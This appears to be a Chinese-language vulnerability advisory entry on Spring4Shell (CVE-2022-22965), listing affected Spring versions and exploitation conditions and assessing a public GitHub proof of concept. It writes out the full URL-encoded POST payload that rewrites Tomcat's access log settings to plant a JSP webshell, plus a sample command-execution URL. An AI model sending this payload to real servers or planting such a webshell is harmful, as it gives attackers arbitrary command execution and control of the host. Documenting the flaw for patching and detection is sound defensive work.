## CVE-2022-22965 Spring4Shell RCE

**漏洞编号:** CVE-2022-22965

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Spring Framework

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Spring Framework versions 5.3.X prior to 5.3.18+, 5.2.x prior to 5.2.20+ and all old and unsupported versions

**利用条件:** JDK 9+, Tomcat as WAR deployment, Spring MVC或Spring WebFlux

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22965，又名Spring4Shell，是一个Spring Framework的远程代码执行漏洞。攻击者可以通过操纵classloader来写入webshell或者执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用条件较为苛刻，需要JDK 9+，并且应用必须部署为WAR包在Tomcat上运行。如果应用以Spring Boot executable jar（默认方式）部署，则不易受到该漏洞影响。

**有效性分析：**
提供的POC代码是有效的。POC利用了Spring Data Binding的特性，通过修改class.module.classLoader.resources.context.parent.pipeline.first的值，修改了Tomcat的access log pattern，从而写入webshell。通过webshell的`Tomcat=S&cmd=`参数可以执行任意命令。

**投毒风险分析：**
提供的POC代码本身没有明显的投毒行为。它直接利用了漏洞来执行命令，没有进行任何尝试来修改或破坏目标系统上的其他文件或组件。代码目的明确，就是利用漏洞执行给定的命令，没有发现其他恶意意图的代码，因此投毒风险可以评估为0%。

**利用方式：**
利用方式主要是通过发送特制的HTTP POST请求，请求体中包含恶意的参数，这些参数用于修改Tomcat的access log pattern。具体步骤如下：

1.  发送包含恶意参数的POST请求，例如：
    ```
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22S%22.equals(request.getParameter(%22Tomcat%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=Shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
    ```
2.  上述请求会在`webapps/ROOT`目录下创建一个名为`Shell.jsp`的webshell。 webshell内容是读取`cmd`参数并执行。
3.  访问webshell，并通过`Tomcat=S&cmd=`参数执行任意命令，例如：
    ```
    http://target.com/Shell.jsp?Tomcat=S&cmd=whoami
    ```

攻击者可以利用这个webshell执行任意系统命令，从而控制服务器。

**项目地址:** [xsxtw/SpringFramework_CVE-2022-22965_RCE](https://github.com/xsxtw/SpringFramework_CVE-2022-22965_RCE)

**漏洞详情:** [CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)